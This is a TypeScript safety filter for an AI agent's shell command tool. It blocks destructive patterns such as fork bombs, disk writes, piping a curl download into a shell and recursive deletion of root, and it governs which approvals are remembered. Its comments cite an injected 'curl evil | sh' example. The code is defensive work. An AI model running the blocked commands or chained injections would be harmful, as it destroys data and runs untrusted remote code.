/**
 * A safety net for run_command. It blocks a few well-known destructive patterns
 * before the user is even asked, and recognises a tiny read-only allowlist.
 *
 * This is NOT a sandbox: shell commands can always be obfuscated. The approval
 * prompt is the real control; this only catches obvious mistakes.
 */

const BLOCKED: { test: (command: string) => boolean; reason: string }[] = [
  { test: (c) => /(^|[\s;&|(])sudo\b/.test(c), reason: 'sudo is not allowed.' },
  { test: (c) => /(^|[\s;&|(])(shutdown|reboot|halt|poweroff)\b/.test(c), reason: 'Shutting down or rebooting is not allowed.' },
  { test: (c) => /(^|[\s;&|(])mkfs(\.\w+)?\b/.test(c), reason: 'Formatting filesystems is not allowed.' },
  { test: (c) => /\bdd\b[^;&|]*\bof=\/dev\//.test(c), reason: 'Writing to devices is not allowed.' },
  { test: (c) => />\s*\/dev\/(sd|nvme|hd|vd)/.test(c), reason: 'Writing to devices is not allowed.' },
  { test: (c) => /:\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:/.test(c), reason: 'Fork bombs are not allowed.' },
  {
    test: (c) => /\b(curl|wget)\b[^;&|]*\|\s*(sudo\s+)?(ba|z|da|k)?sh\b/.test(c),
    reason: 'Piping a download into a shell is not allowed.',
  },
  {
    test: (c) => /\bgit\s+push\b[^;&|]*(\s--force(?!-)\b|\s-f\b)/.test(c),
    reason: 'Force-pushing is not allowed.',
  },
  {
    test: (c) => /\bnpm\s+(i|install|add)\b[^;&|]*(\s-g\b|\s--global\b)/.test(c),
    reason: 'Global installs are not allowed.',
  },
  {
    test: (c) => /\b(chmod|chown)\b[^;&|]*\s-[a-zA-Z]*R[a-zA-Z]*\b[^;&|]*\s\/(\s|$)/.test(c),
    reason: 'Recursive permission changes on / are not allowed.',
  },
  { test: dangerousRm, reason: 'Recursively deleting the filesystem root, home, or the whole workspace is not allowed.' },
];

const DANGEROUS_RM_TARGETS = new Set(['/', '/*', '~', '~/', '~/*', '$HOME', '${HOME}', '$HOME/', '*', '.', './', '..', '.*', './*']);

function dangerousRm(command: string): boolean {
  for (const segment of command.split(/&&|\|\||[;|\n]/)) {
    const tokens = segment.trim().split(/\s+/);
    const rmAt = tokens.findIndex((t) => t === 'rm');
    if (rmAt === -1) continue;
    const args = tokens.slice(rmAt + 1);
    const recursive = args.some((a) => a === '--recursive' || /^-[a-zA-Z]*[rR][a-zA-Z]*$/.test(a));
    if (!recursive) continue;
    for (const target of args.filter((a) => !a.startsWith('-'))) {
      const bare = target.replace(/^["']|["']$/g, '');
      // Top-level system directories such as /usr or /home count too.
      if (DANGEROUS_RM_TARGETS.has(bare) || /^\/[^/]*\/?$/.test(bare)) return true;
    }
  }
  return false;
}

/** Returns why the command is blocked, or null if it may proceed to the approval step. */
export function checkCommand(command: string, extraBlocked: RegExp[] = []): string | null {
  for (const rule of BLOCKED) {
    if (rule.test(command)) return rule.reason;
  }
  for (const pattern of extraBlocked) {
    if (pattern.test(command)) return `Blocked by your "mitram.blockedCommandPatterns" setting (${pattern.source}).`;
  }
  return null;
}

export function hasShellSyntax(command: string): boolean {
  return SHELL_META.test(command);
}

const SHELL_META = /[;&|<>`$(){}\\\n\r*?!#]/;
// A tilde only expands at the start of a word, so it is fine inside refs like HEAD~1.
const SAFE_ARG = /^[\w./:@^=~-]+$/;
const GIT_READ_ONLY = new Set(['status', 'diff', 'log', 'show', 'rev-parse']);
const GIT_BRANCH_ARGS = new Set(['-a', '-r', '-v', '-vv', '--list', '--show-current', '--all', '--remotes']);
const FORBIDDEN_GIT_FLAGS = /^(--output|--ext-diff|--textconv|--exec|-o$|--upload-pack)/;

/**
 * True only for a small set of simple, read-only commands (pwd, ls, and
 * non-writing git inspection). Anything with shell syntax is never "safe".
 */
export function isSafeReadOnlyCommand(command: string): boolean {
  const trimmed = command.trim();
  if (!trimmed || SHELL_META.test(trimmed)) return false;
  const [program, ...args] = trimmed.split(/\s+/);
  if (!args.every((a) => SAFE_ARG.test(a) && !a.startsWith('~'))) return false;

  switch (program) {
    case 'pwd':
      return args.length === 0;
    case 'ls':
      return args.every((a) => !a.startsWith('/') && !a.includes('..'));
    case 'git': {
      const [sub, ...rest] = args;
      if (rest.some((a) => FORBIDDEN_GIT_FLAGS.test(a))) return false;
      if (sub === 'branch') return rest.every((a) => GIT_BRANCH_ARGS.has(a));
      return GIT_READ_ONLY.has(sub);
    }
    default:
      return false;
  }
}

// Programs that run arbitrary code, wrap another command, delete or move files, or reach other
// machines. A rule like "python3 *" or "rm *" would approve far more than the user looked at,
// so these are only ever remembered as the exact command.
const EXACT_ONLY_PROGRAMS = new Set([
  'python', 'py', 'node', 'nodejs', 'deno', 'bun', 'ts-node', 'tsx', 'ruby', 'perl', 'php', 'lua', 'rscript', 'java',
  'bash', 'sh', 'zsh', 'fish', 'dash', 'ksh', 'csh', 'tcsh', 'pwsh', 'powershell', 'cmd', 'osascript',
  'env', 'xargs', 'exec', 'eval', 'command', 'nohup', 'time', 'timeout', 'watch', 'nice', 'sudo', 'su', 'doas',
  'npx', 'pnpx', 'bunx', 'uvx', 'pipx', 'find', 'awk', 'gawk', 'sed',
  'rm', 'rmdir', 'mv', 'cp', 'dd', 'ln', 'chmod', 'chown', 'truncate', 'shred', 'kill', 'killall', 'pkill',
  'curl', 'wget', 'ssh', 'scp', 'rsync', 'nc', 'ncat',
  'docker', 'podman', 'kubectl', 'helm', 'terraform', 'aws', 'az', 'gcloud', 'gh',
]);

// Single-purpose tools (test runners, type checkers, linters) where any arguments are fine.
const ANY_ARGS_PROGRAMS = new Set([
  'pytest', 'jest', 'vitest', 'mocha', 'tsc', 'eslint', 'prettier', 'black', 'mypy', 'pyright', 'flake8', 'pylint', 'rubocop',
]);

// Subcommands that install packages, run arbitrary commands, publish, or throw away work.
const PACKAGE_RISKY = ['install', 'i', 'add', 'ci', 'uninstall', 'remove', 'rm', 'exec', 'x', 'dlx', 'publish', 'link', 'update', 'upgrade'];
const EXACT_ONLY_SUBCOMMANDS = new Map<string, string[]>([
  ['git', ['push', 'reset', 'clean', 'checkout', 'switch', 'restore', 'rm', 'stash', 'branch', 'config', 'gc', 'prune', 'reflog', 'filter-branch']],
  ['npm', PACKAGE_RISKY],
  ['pnpm', PACKAGE_RISKY],
  ['yarn', PACKAGE_RISKY],
  ['pip', ['install', 'uninstall', 'download']],
  ['uv', ['run', 'pip', 'add', 'remove', 'sync', 'tool']],
  ['poetry', ['run', 'add', 'remove', 'install', 'publish']],
  ['cargo', ['install', 'uninstall', 'publish']],
  ['go', ['run', 'install', 'get', 'generate']],
  ['dotnet', ['tool', 'add', 'remove', 'nuget']],
]);

const RUNS_SCRIPTS = new Set(['npm', 'pnpm', 'yarn']);
const SUBCOMMAND = /^[a-z][\w:-]*$/i;
const SCRIPT_NAME = /^\w[\w:.-]*$/;

/** "python3.11" and "node.exe" are python and node. */
const programName = (program: string) => program.toLowerCase().replace(/\.exe$/, '').replace(/[\d.]+$/, '');

/**
 * A command the user chose to "always allow": either exactly as written, or a prefix of
 * whole words followed by any further arguments ("npm run lint *").
 */
export interface CommandRule {
  command: string;
  anyArgs: boolean;
}

/** How a rule is shown to the user. */
export function describeRule(rule: CommandRule): string {
  return rule.anyArgs ? `${rule.command} *` : rule.command;
}

/**
 * The rule to offer when the user chooses "Always allow" for a command. Commands with shell
 * syntax are only ever remembered exactly, since a pipe or `&&` can hide a second command.
 */
export function suggestCommandRule(command: string): CommandRule | null {
  const trimmed = command.trim();
  if (!trimmed) return null;
  const exact = { command: trimmed, anyArgs: false };
  if (hasShellSyntax(trimmed)) return exact;
  const [program, sub, script] = trimmed.split(/\s+/);
  const name = programName(program);
  const prefix = (...words: string[]) => ({ command: words.join(' '), anyArgs: true });

  // A path such as ./gradlew may point at a file the agent can rewrite.
  if (program.includes('/') || EXACT_ONLY_PROGRAMS.has(name)) return exact;
  if (ANY_ARGS_PROGRAMS.has(name)) return prefix(program);
  if (!sub || !SUBCOMMAND.test(sub) || EXACT_ONLY_SUBCOMMANDS.get(name)?.includes(sub)) return exact;
  if (RUNS_SCRIPTS.has(name) && (sub === 'run' || sub === 'run-script')) {
    return script && SCRIPT_NAME.test(script) ? prefix(program, sub, script) : exact;
  }
  return prefix(program, sub);
}

/**
 * True if a saved rule covers this command. An exact rule must match character for character
 * (after trimming), which is what makes it safe for shell syntax. A prefix rule never covers
 * shell syntax, so "npm test *" cannot approve "npm test && curl evil | sh".
 */
export function matchesRule(rule: CommandRule, command: string): boolean {
  const trimmed = command.trim();
  if (!rule.anyArgs) return trimmed === rule.command;
  if (!trimmed || hasShellSyntax(trimmed)) return false;
  const words = trimmed.split(/\s+/);
  return rule.command.split(' ').every((word, i) => words[i] === word);
}

/**
 * Compiles user patterns so they must match the WHOLE command. This stops "npm test" from
 * also approving "npm test && curl evil | sh".
 */
export function compileAnchoredPatterns(patterns: string[]): RegExp[] {
  return compilePatterns(patterns.map((p) => `^(?:${p})$`));
}

export function compilePatterns(patterns: string[]): RegExp[] {
  const out: RegExp[] = [];
  for (const p of patterns) {
    try {
      out.push(new RegExp(p));
    } catch {
      // Ignore invalid user patterns rather than failing every command.
    }
  }
  return out;
}
